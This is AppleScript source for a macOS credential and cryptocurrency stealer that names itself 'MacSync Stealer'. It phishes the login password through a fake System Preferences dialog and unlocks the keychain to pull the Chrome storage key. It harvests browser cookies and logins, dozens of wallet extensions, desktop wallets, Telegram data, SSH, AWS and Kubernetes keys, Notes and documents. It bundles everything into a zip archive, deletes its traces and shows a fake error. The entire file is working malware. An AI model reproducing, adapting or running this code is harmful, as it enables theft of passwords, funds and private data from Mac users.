```applescript
on filesizer(paths)
        set fsz to 0
        try
                set theItem to quoted form of POSIX path of paths
                set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
        end try
        return fsz
end filesizer

on mkdir(someItem)
        try
                set filePosixPath to quoted form of (POSIX path of someItem)
                do shell script "mkdir -p " & filePosixPath
        end try
end mkdir

on FileName(filePath)
        try
                set reversedPath to (reverse of every character of filePath) as string
                set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
                set finalPath to (reverse of every character of trimmedPath) as string
                return finalPath
        end try
end FileName

on BeforeFileName(filePath)
        try
                set lastSlash to offset of "/" in (reverse of every character of filePath) as string
                set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
                return trimmedPath
        end try
end BeforeFileName

on writeText(textToWrite, filePath)
        try
                set folderPath to BeforeFileName(filePath)
                mkdir(folderPath)
                set fileRef to (open for access filePath with write permission)
                write textToWrite to fileRef starting at eof
                close access fileRef
        end try
end writeText

on readwrite(path_to_file, path_as_save)
        try
                set fileContent to read path_to_file
                set folderPath to BeforeFileName(path_as_save)
                mkdir(folderPath)
                do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
        end try
end readwrite

on readwriteSafe(path_to_file, path_as_save)
    try
        set folderPath to BeforeFileName(path_as_save)
        mkdir(folderPath)
        do shell script "/bin/cp " & quoted form of path_to_file & " " & quoted form of path_as_save
    end try
end readwriteSafe

on isDirectory(someItem)
        try
                set filePosixPath to quoted form of (POSIX path of someItem)
                set fileType to (do shell script "file -b " & filePosixPath)
                if fileType ends with "directory" then
                        return true
                end if
                return false
        end try
end isDirectory

on GrabFolderLimit(sourceFolder, destinationFolder)
        try
                set bankSize to 0
                set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
                set fileList to list folder sourceFolder without invisibles
                mkdir(destinationFolder)
                repeat with currentItem in fileList
                        if currentItem is not in exceptionsList then
                                set itemPath to sourceFolder & "/" & currentItem
                                set savePath to destinationFolder & "/" & currentItem
                                if isDirectory(itemPath) then
                                        GrabFolderLimit(itemPath, savePath)
                                else
                                        set fsz to filesizer(itemPath)
                                        set bankSize to bankSize + fsz
                                        if bankSize < 100 *1024* 1024 then
                                                readwrite(itemPath, savePath)
                                        end if
                                end if
                        end if
                end repeat
        end try
end GrabFolderLimit

on GrabFolder(sourceFolder, destinationFolder)
        try
                set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "dumps", "emoji", "user_data", "__update__"}
                set fileList to list folder sourceFolder without invisibles
                mkdir(destinationFolder)
                repeat with currentItem in fileList
                        if currentItem is not in exceptionsList then
                                set itemPath to sourceFolder & "/" & currentItem
                                set savePath to destinationFolder & "/" & currentItem
                                if isDirectory(itemPath) then
                                        GrabFolder(itemPath, savePath)
                                else
                                        readwrite(itemPath, savePath)
                                end if
                        end if
                end repeat
        end try
end GrabFolder

on checkvalid(username, password_entered)
        try
                set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
                if result is not equal to "" then
                        return false
                else
                        return true
                end if
        on error
                return false
        end try
end checkvalid

on getpwd(username, writemind, provided_password)
        try
                if provided_password is not equal to "" then
                        if checkvalid(username, provided_password) then
                                writeText(provided_password, writemind & "Password")
                                do shell script "security unlock-keychain -p " & quoted form of provided_password & " ~/Library/Keychains/login.keychain-db"
                                do shell script "security set-generic-password-partition-list -s \"Chrome Safe Storage\" -a \"Chrome\" -S \"apple-tool:,apple:,teamid:EQHXZ8M8AV\" -k " & quoted form of provided_password
                                set masterpass to do shell script "security find-generic-password -wa \"Chrome\""
                                writeText(masterpass as string, writemind & "ChromeStorage")
                                return provided_password
                        end if
                end if
                if checkvalid(username, "") then
                        set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
                        writeText(result as string, writemind & "ChromeStorage")
                        return ""
                else
                        repeat
                                set imagePath to "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/LockedIcon.icns" as POSIX file
                                set result to display dialog "You should update the settings to launch the application." default answer "" with icon imagePath buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
                                set password_entered to text returned of result
                                if checkvalid(username, password_entered) then
                                        writeText(password_entered, writemind & "Password")
                                        do shell script "security unlock-keychain -p " & quoted form of password_entered & " ~/Library/Keychains/login.keychain-db"
                                        do shell script "security set-generic-password-partition-list -s \"Chrome Safe Storage\" -a \"Chrome\" -S \"apple-tool:,apple:,teamid:EQHXZ8M8AV\" -k " & quoted form of password_entered
                                        set masterpass to do shell script "security find-generic-password -wa \"Chrome\""
                                        writeText(masterpass as string, writemind & "ChromeStorage")
                                        return password_entered
                                end if
                        end repeat
                end if
        end try
        return ""
end getpwd

on grabPlugins(paths, savePath, pluginList, index)
        try
                set fileList to list folder paths without invisibles
                repeat with PFile in fileList
                        repeat with Plugin in pluginList
                                if (PFile contains Plugin) then
                                        set newpath to paths & PFile
                                        set newsavepath to savePath & "/" & Plugin
                                        if index then
                                                set newsavepath to savePath & "/IndexedDB/" & PFile
                                        end if
                                        GrabFolder(newpath, newsavepath)
                                end if
                        end repeat
                end repeat
        end try
end grabPlugins

on Chromium(writemind, chromium_map)

        set pluginList to {}
    set pluginList to pluginList & {"eiaeiblijfjekdanodkjadfinkhbfgcd", "aeblfdkhhhdcdjpifhhbdiojplfjncoa"}
    set pluginList to pluginList & {"bfogiafebfohielmmehodmfbbebbbpei", "nngceckbapebfimnlniiiahkandclblb"}
    set pluginList to pluginList & {"fdjamakpfbbddfjaooikfcpapjohcfmg", "hdokiejnpimakedhajhdlcegeplioahd"}
    set pluginList to pluginList & {"pnlccmojcmeohlpggmfnbbiapkmbliob", "ghmbeldphafepmbegfdlkpapadhbakde"}
    set pluginList to pluginList & {"kmcfomidfpdkfieipokbalgegidffkal", "bnfdmghkeppfadphbnkjcicejfepnbfe"}
    set pluginList to pluginList & {"caljgklbbfbcjjanaijlacgncafpegll", "folnjigffmbjmcjgmbbfcpleeddaedal"}
    set pluginList to pluginList & {"igkpcodhieompeloncfnbekccinhapdb", "admmjipmmciaobhojoghlmleefbicajg"}
    set pluginList to pluginList & {"ehpbfbahieociaeckccnklpdcmfaeegd", "epanfjkfahimkgomnigadpkobaefekcd"}
    set pluginList to pluginList & {"didegimhafipceonhjepacocaffmoppf", "oboonakemofpalcgghocfoadofidjkkk"}
    set pluginList to pluginList & {"jgnfghanfbjmimbdmnjfofnbcgpkbegj", "mmhlniccooihdimnnjhamobppdhaolme"}
    set pluginList to pluginList & {"dbfoemgnkgieejfkaddieamagdfepnff", "bhghoamapcdpbohphigoooaddinpkbai"}
    set pluginList to pluginList & {"nngceckbapebfimnlniiiahkandclblb", "lojeokmpinkpmpbakfkfpgfhpapbgdnd"}
    set pluginList to pluginList & {"ibpjepoimpcdofeoalokgpjafnjonkpc", "gmohoglkppnemohbcgjakmgengkeaphi"}
    set pluginList to pluginList & {"hdokiejnpimakedhajhdlcegeplioahd", "oboonakemofpalcgghocfoadofidjkkk"}
    set pluginList to pluginList & {"dckgbiealcgdhgjofgcignfngijpbgba", "gmegpkknicehidppoebnmbhndjigpica"}
    set pluginList to pluginList & {"eiokpeobbgpinbmcanngjjbklmhlepan", "odfkmgboddhcgopllebhkbjhokpojigd"}
    set pluginList to pluginList & {"ppnbnpeolgkicgegkbkbjmhlideopiji", "cejfhijdfemlohmcjknpbeaohedoikpp"}
    set pluginList to pluginList & {"nmhjblhloefhbhgbfkdgdpjabaocnhha", "iklgijhacenjgjgdnpnohbafpbmnccek"}
    set pluginList to pluginList & {"ppkkcfblhfgmdmefkmkoomenhgecbemi", "lgndjfkadlbpaifdpbbobdodbaiaiakb"}
    set pluginList to pluginList & {"bbphmbmmpomfelajledgdkgclfekilei", "bnfooenhhgcnhdkdjelgmmkpaemlnoek"}

        set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
        repeat with chromium in chromium_map
                set savePath to writemind & "Browsers/" & item 1 of chromium & "_"
                try
                        set fileList to list folder item 2 of chromium without invisibles
                        repeat with currentItem in fileList
                                if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
                                        set profileName to (item 1 of chromium & currentItem)
                                        repeat with CFile in chromiumFiles
                                                set readpath to (item 2 of chromium & currentItem & CFile)
                                                if ((CFile as string) is equal to "/Network/Cookies") then
                                                        set CFile to "/Cookies"
                                                end if
                                                if ((CFile as string) is equal to "/Local Extension Settings/") then
                                                        grabPlugins(readpath, writemind & "Extensions/" & profileName, pluginList, false)
                                                else if (CFile as string) is equal to "/IndexedDB/" then
                                                        grabPlugins(readpath, writemind & "Extensions/" & profileName, pluginList, true)
                                                else
                                                        set writepath to savePath & currentItem & CFile
                                                        readwrite(readpath, writepath)
                                                end if
                                        end repeat
                                end if
                        end repeat
                end try
        end repeat
end Chromium

on ChromiumWallets(writemind, chromium_map)

        set pluginList to {}

        set pluginList to pluginList & {"nkbihfbeogaeaoehlefnkodbefgpgknn", "bfnaelmomeimhlpmgjnjophhpkkoljpa"}
        set pluginList to pluginList & {"hnfanknocfeofbddgcijnmhnfnkdnaad", "fnjhmkhhmkbjkkabndcnnogagogbneec"}
        set pluginList to pluginList & {"acmacodkjbdgmoleebolmdjonilkdbch", "egjidjbpglichdcondbcbdnbeeppgdph"}
        set pluginList to pluginList & {"aholpfdialjgjfhomihkjbmgjidlcdno", "pdliaogehgdbhbnmkklieghmmjkpigpa"}
        set pluginList to pluginList & {"mcohilncbfahbmgdjkbpemcciiolgcge", "hpglfhgfnhbgpjdenjgmdgoeiappafln"}
        set pluginList to pluginList & {"bhhhlbepdkbapadjdnnojkbgioiodbic", "cjmkndjhnagcfbpiemnkdpomccnjblmj"}
        set pluginList to pluginList & {"kamfleanhcmjelnhaeljonilnmjpkcjc", "jnldfbidonfeldmalbflbmlebbipcnle"}
        set pluginList to pluginList & {"fdcnegogpncmfejlfnffnofpngdiejii", "klnaejjgbibmhlephnhpmaofohgkpgkd"}
        set pluginList to pluginList & {"kjjebdkfeagdoogagbhepmbimaphnfln", "ldinpeekobnhjjdofggfgjlcehhmanlj"}
        set pluginList to pluginList & {"kpfchfdkjhcoekhdldggegebfakaaiog", "idnnbdplmphpflfnlkomgpfbpcgelopg"}
        set pluginList to pluginList & {"mlhakagmgkmonhdonhkpjeebfphligng", "bipdhagncpgaccgdbddmbpcabgjikfkn"}
        set pluginList to pluginList & {"nhnkbkgjikgcigadomkphalanndcapjk", "klghhnkeealcohjjanjjdaeeggmfmlpl"}
        set pluginList to pluginList & {"ebfidpplhabeedpnhjnobghokpiioolj", "emeeapjkbcbpbpgaagfchmcgglmebnen"}
        set pluginList to pluginList & {"fldfpgipfncgndfolcbkdeeknbbbnhcc", "penjlddjkjgpnkllboccdgccekpkcbin"}
        set pluginList to pluginList & {"hmeobnfnfcmdkdcmlblgagmfpfboieaf", "omaabbefbmiijedngplfjmnooppbclkk"}
        set pluginList to pluginList & {"jnlgamecbpmbajjfhmmmlhejkemejdma", "fpkhgmpbidmiogeglndfbkegfdlnajnf"}
        set pluginList to pluginList & {"bifidjkcdpgfnlbcjpdkdcnbiooooblg", "amkmjjmmflddogmhpjloimipbofnfjih"}
        set pluginList to pluginList & {"aeachknmefphepccionboohckonoeemg", "dmkamcknogkgcdfhhbddcghachkejeap"}
        set pluginList to pluginList & {"aiifbnbfobpmeekipheeijimdpnlpgpp", "ehgjhhccekdedpbkifaojjaefeohnoea"}
        set pluginList to pluginList & {"nknhiehlklippafakaeklbeglecifhad", "nphplpgoakhhjchkkhmiggakijnkhfnd"}
        set pluginList to pluginList & {"ibnejdfjmmkpcnlpebklmnkoeoihofec", "afbcbjpbpfadlkmhmclhkeeodmamcflc"}
        set pluginList to pluginList & {"efbglgofoippbgcjepnhiblaibcnclgk", "fccgmnglbhajioalokbcidhcaikhlcpm"}
        set pluginList to pluginList & {"mgffkfbidihjpoaomajlbgchddlicgpn", "fopmedgnkfpebgllppeddmmochcookhc"}
        set pluginList to pluginList & {"jojhfeoedkpkglbfimdfabpdfjaoolaf", "abkahkcbhngaebpcgfmhkoioedceoigp"}
        set pluginList to pluginList & {"gkeelndblnomfmjnophbhfhcjbcnemka", "hgbeiipamcgbdjhfflifkgehomnmglgk"}
        set pluginList to pluginList & {"ellkdbaphhldpeajbepobaecooaoafpg", "mdnaglckomeedfbogeajfajofmfgpoae"}
        set pluginList to pluginList & {"ckklhkaabbmdjkahiaaplikpdddkenic", "fmblappgoiilbgafhjklehhfifbdocee"}
        set pluginList to pluginList & {"cnmamaachppnkjgnildpdmkaakejnhae", "fijngjgcjhjmmpcmkeiomlglpeiijkld"}
        set pluginList to pluginList & {"lbjapbcmmceacocpimbpbidpgmlmoaao", "ibljocddagjghmlpgihahamcghfggcjc"}
        set pluginList to pluginList & {"gkodhkbmiflnmkipcmlhhgadebbeijhh", "dbgnhckhnppddckangcjbkjnlddbjkna"}
        set pluginList to pluginList & {"agoakfejjabomempkjlepdflaleeobhb", "dgiehkgfknklegdhekgeabnhgfjhbajd"}
        set pluginList to pluginList & {"onhogfjeacnfoofkfgppdlbmlmnplgbn", "ojggmchlghnjlapmfbnjholfjkiidbch"}
        set pluginList to pluginList & {"pmmnimefaichbcnbndcfpaagbepnjaig", "anokgmphncpekkhclmingpimjmcooifb"}
        set pluginList to pluginList & {"kkpllkodjeloidieedojogacfhpaihoh", "iokeahhehimjnekafflcihljlcjccdbe"}
        set pluginList to pluginList & {"ifckdpamphokdglkkdomedpdegcjhjdp", "loinekcabhlmhjjbocijdoimmejangoa"}
        set pluginList to pluginList & {"fcfcfllfndlomdhbehjjcoimbgofdncg", "ifclboecfhkjbpmhgehodcjpciihhmif"}
        set pluginList to pluginList & {"ookjlbkiijinhpmnjffcofjonbfbgaoc", "oafedfoadhdjjcipmcbecikgokpaphjk"}
        set pluginList to pluginList & {"mapbhaebnddapnmifbbkgeedkeplgjmf", "lgmpcpglpngdoalbgeoldeajfclnhafa"}
        set pluginList to pluginList & {"ppbibelpcjmhbdihakflkdcoccbgbkpo", "ffnbelfdoeiohenkjibnmadjiehjhajb"}
        set pluginList to pluginList & {"opcgpfmipidbgpenhmajoajpbobppdil", "hdkobeeifhdplocklknbnejdelgagbao"}
        set pluginList to pluginList & {"lnnnmfcpbkafcpgdilckhmhbkkbpkmid", "nbdhibgjnjpnkajaghbffjbkcgljfgdi"}
        set pluginList to pluginList & {"kmhcihpebfmpgmihbkipmjlmmioameka", "kmphdnilpmdejikjdnlbcnmnabepfgkh"}
        set pluginList to pluginList & {"khpkpbbcccdmmclmpigdgddabeilkdpd", "dlcobpjiigpikoobohmabehhmhfoodbb"}
        set pluginList to pluginList & {"mkpegjkblkkefacfnmkajcjmabijhclg", "dldjpboieedgcmpkchcjcbijingjcgok"}
        set pluginList to pluginList & {"jiidiaalihmmhddjgbnbgdfflelocpak"}

        set chromiumFiles to {"/Local Extension Settings/", "/IndexedDB/"}
        repeat with chromium in chromium_map
                try
                        set fileList to list folder item 2 of chromium without invisibles
                        repeat with currentItem in fileList
                                if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
                                        set profileName to (item 1 of chromium & currentItem)
                                        repeat with CFile in chromiumFiles
                                                set readpath to (item 2 of chromium & currentItem & CFile)
                                                if ((CFile as string) is equal to "/Local Extension Settings/") then
                                                        grabPlugins(readpath, writemind & "Wallets/Web/" & profileName, pluginList, false)
                                                else if (CFile as string) is equal to "/IndexedDB/" then
                                                        grabPlugins(readpath, writemind & "Wallets/Web/" & profileName, pluginList, true)
                                                else
                                                        set writepath to savePath & currentItem & CFile
                                                        readwrite(readpath, writepath)
                                                end if
                                        end repeat
                                end if
                        end repeat
                end try
        end repeat
end Chromium

on Gecko(writemind, gecko_map)
        set geckoFiles to {"/cert9.db", "/cookies.sqlite", "/cookies.sqlite-wal", "/formhistory.sqlite", "/key4.db", "/logins-backup.json", "/logins.json", "/signons.sqlite", "/places.sqlite"}
        repeat with gecko in gecko_map
                set savePath to writemind & "Browsers/" & item 1 of gecko & "_"
        try
                        set fileList to list folder item 2 of gecko without invisibles
                        repeat with currentItem in fileList
                                if ((currentItem as string) contains "Profile") or ((currentItem as string) contains ".default") then
                                        set profileName to (item 1 of gecko & currentItem)
                                        repeat with CFile in geckoFiles
                                                set readpath to (item 2 of gecko & currentItem & CFile)
                                                set writepath to savePath & currentItem & CFile
                                                readwrite(readpath, writepath)
                                        end repeat
                                end if
                        end repeat
        end try
    end repeat
end Gecko

on Telegram(writemind, library)
                try
                        GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Desktop/")
                end try
end Telegram

on Keychains(writemind)
                try
                        do shell script "cp ~/Library/Keychains/*.keychain-db " & quoted form of (POSIX path of writemind)
                end try
end Keychains

on CloudKeys(writemind)
                try
                        do shell script "cp -r ~/.ssh " & quoted form of (POSIX path of writemind)
                end try
                try
                        do shell script "cp -r ~/.aws " & quoted form of (POSIX path of writemind)
                end try
                try
                        do shell script "cp -r ~/.kube " & quoted form of (POSIX path of writemind)
                end try
end CloudKeys

on Processes(writemind)
    try
        do shell script "mkdir -p " & quoted form of (writemind & "SystemInfo/")
    end try
    try
        do shell script "lsappinfo list > " & quoted form of (writemind & "SystemInfo/running_apps.txt")
    end try
    try
        do shell script "ps ax > " & quoted form of (writemind & "SystemInfo/processes.txt")
    end try
end Processes

on DesktopWallets(writemind, deskwals)
        repeat with deskwal in deskwals
                try
                        GrabFolder(item 2 of deskwal, writemind & item 1 of deskwal)
                end try
        end repeat
end DesktopWallets

on Filegrabber(writemind)
 try
  set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
  mkdir(destinationFolderPath)
  set destinationSafariPath to POSIX file (writemind & "Safari/")
  mkdir(destinationSafariPath)
  set destinationNotesPath to POSIX file (writemind & "Notes/")
  mkdir(destinationNotesPath)
  set extensionsList to {"pdf", "docx", "doc", "wallet", "key", "keys", "db", "txt", "seed", "rtf", "kdbx", "pem", "ovpn"}
  set bankSize to 0
  set fileCounter to 1

  tell application "Finder"
        try
                duplicate file ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:Cookies.binarycookies") to folder (destinationSafariPath) with replacing
        end try
        try
                set notesDB to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"
                set dbFiles to {"NoteStore.sqlite", "NoteStore.sqlite-shm", "NoteStore.sqlite-wal"}
                repeat with dbFile in dbFiles
                        try
                                duplicate (file dbFile of folder notesDB) to folder (destinationNotesPath) with replacing
                        end try
                end repeat
        end try
        try
                set desktopFiles to every file of desktop
                set documentsFiles to every file of folder "Documents" of (path to home folder)
                set downloadsFiles to every file of folder "Downloads" of (path to home folder)

                repeat with aFile in (desktopFiles & documentsFiles & downloadsFiles)
                set fileExtension to name extension of aFile
                if fileExtension is in extensionsList then
                set filesize to size of aFile
                if (bankSize + filesize) < 10 * 1024 * 1024 then
                try
                        set newFileName to (fileCounter as string) & "." & fileExtension
                        duplicate aFile to folder destinationFolderPath with replacing
                        set destFolderAlias to destinationFolderPath as alias
                        tell application "Finder"
                        set copiedFiles to every file of folder destFolderAlias
                        set lastCopiedFile to item -1 of copiedFiles
                        set name of lastCopiedFile to newFileName
                        end tell

                        set bankSize to bankSize + filesize
                        set fileCounter to fileCounter + 1
                end try
                else
                exit repeat
                end if
                end if
                end repeat
        end try
  end tell
 end try
end Filegrabber

on FilegrabberFDA(writemind, profile)
        set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
        mkdir(destinationFolderPath)
        try
                set sourceFolders to {profile & "/Downloads/", profile & "/Documents/", profile & "/Desktop/"}
                set extensionsList to {"pdf", "docx", "doc", "wallet", "key", "keys", "db", "txt", "seed", "rtf", "kdbx", "pem", "ovpn"}

                repeat with src in sourceFolders
                        repeat with ext in extensionsList
                                try
                                        set shellCmd to "find " & quoted form of (POSIX path of src) & " -maxdepth 1 -type f -iname '*." & ext & "' -print0 | xargs -0 -J% cp -vp % " & quoted form of (POSIX path of destinationFolderPath)
                                        do shell script shellCmd
                                end try
                        end repeat
                end repeat
        end try
        try
                readwrite(profile & "/Library/Cookies/Cookies.binarycookies", writemind & "Safari/Cookies.binarycookies")
                readwrite(profile & "/Library/Safari/Form Values", writemind & "Safari/Autofill")
                readwrite(profile & "/Library/Safari/History.db", writemind & "Safari/History.db")
        end try
        try
                readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", writemind & "Notes/NoteStore.sqlite")
                readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm", writemind & "Notes/NoteStore.sqlite-shm")
                readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal", writemind & "Notes/NoteStore.sqlite-wal")
        end try
end Filegrabber

try
        do shell script "killall Terminal"
end try

set username to (system attribute "USER")
set profile to "/Users/" & username
set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
set writemind to "/tmp/sync" & randomNumber & "/"

set library to profile & "/Library/Application Support/"
set password_entered to getpwd(username, writemind, "")

delay 0.01

set chromiumMap to {}
set chromiumMap to chromiumMap & {{"Yandex", library & "Yandex/YandexBrowser/"}}
set chromiumMap to chromiumMap & {{"Chrome", library & "Google/Chrome/"}}
set chromiumMap to chromiumMap & {{"Brave", library & "BraveSoftware/Brave-Browser/"}}
set chromiumMap to chromiumMap & {{"Edge", library & "Microsoft Edge/"}}
set chromiumMap to chromiumMap & {{"Vivaldi", library & "Vivaldi/"}}
set chromiumMap to chromiumMap & {{"Opera", library & "com.operasoftware.Opera/"}}
set chromiumMap to chromiumMap & {{"OperaGX", library & "com.operasoftware.OperaGX/"}}
set chromiumMap to chromiumMap & {{"Chrome Beta", library & "Google/Chrome Beta/"}}
set chromiumMap to chromiumMap & {{"Chrome Canary", library & "Google/Chrome Canary"}}
set chromiumMap to chromiumMap & {{"Chromium", library & "Chromium/"}}
set chromiumMap to chromiumMap & {{"Chrome Dev", library & "Google/Chrome Dev/"}}
set chromiumMap to chromiumMap & {{"Arc", library & "Arc/User Data"}}
set chromiumMap to chromiumMap & {{"Coccoc", library & "CocCoc/Browser/"}}

set geckoMap to {}
set geckoMap to geckoMap & {{"Firefox", library & "Firefox/Profiles/"}}
set geckoMap to geckoMap & {{"Zen", library & "zen/Profiles/"}}
set geckoMap to geckoMap & {{"LibreWolf", library & "LibreWolf/Profiles/"}}
set geckoMap to geckoMap & {{"Waterfox", library & "Waterfox/Profiles/"}}

set walletMap to {}
set walletMap to walletMap & {{"Wallets/Desktop/Exodus", library & "Exodus/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Electrum", profile & "/.electrum/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Atomic", library & "Atomic Wallet/Local Storage/leveldb/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Guarda", library & "Guarda/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Coinomi", library & "Coinomi/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Sparrow", profile & "/.sparrow/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Wasabi", profile & "/.walletwasabi/client/Wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Bitcoin_Core", library & "Bitcoin/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Armory", library & "Armory/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Electron_Cash", profile & "/.electron-cash/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Monero", profile & "/.bitmonero/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Litecoin_Core", library & "Litecoin/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Dash_Core", library & "DashCore/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Dogecoin_Core", library & "Dogecoin/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/BlueWallet", library & "BlueWallet/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Zengo", library & "Zengo/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Trust", library & "Trust Wallet/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Ledger Live", library & "Ledger Live/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Ledger Wallet", library & "Ledger Wallet/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Trezor Suite", library & "@trezor"}}

set dotFiles to {"/" & "." & "zshrc", "/" & "." & "zsh" & "_history", "/" & "." & "bash" & "_history", "/" & "." & "git" & "config"}
set saveNames to {"Profile/" & "." & "zshrc", "Profile/" & "." & "zsh" & "_history", "Profile/" & "." & "bash" & "_history", "Profile/" & "." & "git" & "config"}
repeat with i from 1 to count of dotFiles
    readwriteSafe(profile & item i of dotFiles, writemind & item i of saveNames)
end repeat

writeText(username, writemind & "Username")
writeText("1.1.2_release (x64_86 & ARM)", writemind & "Version")

try
        writeText("MacSync Stealer\n\n", writemind & "info")
        writeText("Build Tag: brew\n", writemind & "info")
        writeText("Version: 1.1.2_release (x64_86 & ARM)\n", writemind & "info")
        writeText("IP: 2404:c140:2005:0:cd:6829:7ed6:8144\n\n", writemind & "info")
        writeText("Username: " & username, writemind & "info")
        writeText("\nPassword: " & password_entered & "\n\n", writemind & "info")
    set softwareInfo to (do shell script "system_profiler SPSoftwareDataType")
    set hardwareInfo to (do shell script "system_profiler SPHardwareDataType")
    set displaysInfo to (do shell script "system_profiler SPDisplaysDataType")
    set result to softwareInfo & linefeed & hardwareInfo & linefeed & displaysInfo
        writeText(result, writemind & "info")
end try

Chromium(writemind, chromiumMap)
ChromiumWallets(writemind, chromiumMap)
Gecko(writemind, geckoMap)
DesktopWallets(writemind, walletMap)
Telegram(writemind, library)
Keychains(writemind)
CloudKeys(writemind & "Profile/")
Processes(writemind)

Filegrabber(writemind)

try
        do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/osalogging.zip"
end try
try
        do shell script "rm -rf /tmp/sync*"
end try

display dialog "Your Mac does not support this application. Try reinstalling or downloading the version for your system." with title "System Preferences" with icon stop buttons {"ОК"}
```
